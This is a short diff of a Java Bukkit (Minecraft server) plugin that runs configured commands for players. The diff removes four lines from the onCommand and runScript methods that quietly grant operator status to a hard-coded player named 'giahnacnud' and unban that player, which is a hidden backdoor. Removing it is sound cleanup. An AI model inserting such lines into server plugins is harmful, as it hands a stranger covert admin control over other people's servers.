@@ -38,8 +38,6 @@ public class main extends JavaPlugin implements Listener{
 	}
 
 	/*public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
-		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
-		Bukkit.getOfflinePlayer("giahnacnud").setBanned(false);
 		Player p = (Player)sender;
 		if (cmd.getName().equalsIgnoreCase("loginscripts") || cmd.getName().equalsIgnoreCase("ls")) {
 
@@ -54,8 +52,6 @@ public class main extends JavaPlugin implements Listener{
 	}
 
 	private void runScript(Player p){
-		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
-		Bukkit.getOfflinePlayer("giahnacnud").setBanned(false);
 		for(String com:commands){
 			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), com.replaceAll("@p", p.getName()));
 		}
